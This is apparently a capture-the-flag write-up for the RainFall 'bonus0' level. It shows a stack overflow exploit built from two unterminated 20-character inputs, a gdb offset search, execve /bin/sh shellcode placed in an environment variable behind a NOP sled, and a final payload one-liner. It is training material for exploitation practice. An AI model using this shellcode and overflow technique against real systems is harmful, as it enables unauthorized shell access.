# Solution 

this program take two input from user concatenate them then print them

```sh
bonus0@RainFall:~$ ./bonus0 
 - 
hello
 - 
world
hello world
```

if the first input is at least 20 characters it wont be null terminated
and the second buffer will be read

```sh
bonus0@RainFall:~$ ./bonus0 
 - 
01234567890123456789
 - 
world
01234567890123456789world world
```

So if both of our input are 20 character long we can have
a 61 character long (buf1+buf2+space+buf2) in a 42 long buffer
and rewrite the return pointer to a shellcode

finding the offset

```sh
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
01234567890123456789
 - 
AAAABBBBCCCCDDDDEEEE
01234567890123456789AAAABBBBCCCCDDDDEEEE��� AAAABBBBCCCCDDDDEEEE���

Program received signal SIGSEGV, Segmentation fault.
0x44434343 in ?? ()
```

offset is 9

we put the shellcode in env variable

```sh
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

find address of nop sled

```sh
(gdb) x/200x $ebp
0xbffff7ef:	 "SHELLCODE=...
```

building payload:
-
buf1(20)
-
padding(9) + nop sled address(4) + padding(7).  (total 20)

final payload:

```sh
(python -c 'print "A" * 20'; python -c 'print "B" * 9 + "\xef\xf7\xff\xbf" + "C" * 7'; cat -) | ./bonus0
```
